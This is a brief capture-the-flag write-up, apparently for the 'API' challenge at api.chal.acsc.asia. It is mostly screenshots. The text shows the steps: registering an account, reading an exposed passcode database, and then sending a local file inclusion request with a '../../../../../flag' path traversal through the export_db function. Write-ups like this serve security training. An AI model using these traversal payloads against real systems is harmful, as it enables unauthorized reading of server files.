# API

![](../.gitbook/assets/image%20%2825%29.png)

First we sign up account

![](../.gitbook/assets/image%20%2822%29.png)

Sign up : user = 3-&gt;15 character & pw = 8-&gt;15 character and other conditions

![](../.gitbook/assets/image%20%2823%29.png)

```text
id=Jisoo0301jisoo&pw=Jisoo0301jisoo&c=u
```

![](../.gitbook/assets/image%20%2824%29.png)

![](../.gitbook/assets/image%20%2821%29.png)

```text
https://api.chal.acsc.asia/lib/db/passcode.db => pas=:<vNk
```

Now we use LFI to solve

![](../.gitbook/assets/image%20%2826%29.png)

Use "gd" to export\_db

```text
id=Jisoo0301jisoo&pw=Jisoo0301jisoo&c=i&c2=gd&pas=:<vNk&&db=../../../../../flag
```

![](../.gitbook/assets/image%20%2827%29.png)

